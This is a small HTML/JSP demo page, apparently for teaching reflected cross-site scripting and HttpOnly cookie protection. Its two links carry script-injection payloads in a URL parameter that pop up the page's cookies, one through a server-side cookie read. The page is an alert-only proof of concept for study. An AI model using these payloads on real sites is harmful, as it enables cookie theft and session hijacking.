<!DOCTYPE html>
<html>
<head>
	<title>XSS</title>
</head>
<script src="jquery-1.4.4.min.js"></script>
<body>

<a href="./index.jsp?name=');</script><script>alert(document.cookie)//">
Attack_You_HttpOnly_cookie
</a>

<br>

<a href="./index.jsp?name=');</script><script>alert('<%=request.getCookies()[0].getValue()%>');//">Attack_You_NOT_HttpOnly_cookie
</a>

<span id="p1"></span>

</body>
<script type="text/javascript">
		
		
		if(document.URL.match(/name\=([^&]*)/)){
			var name = unescape(RegExp.$1);
			$('#p1').text(unescape(name));
		}
		
</script>
</html>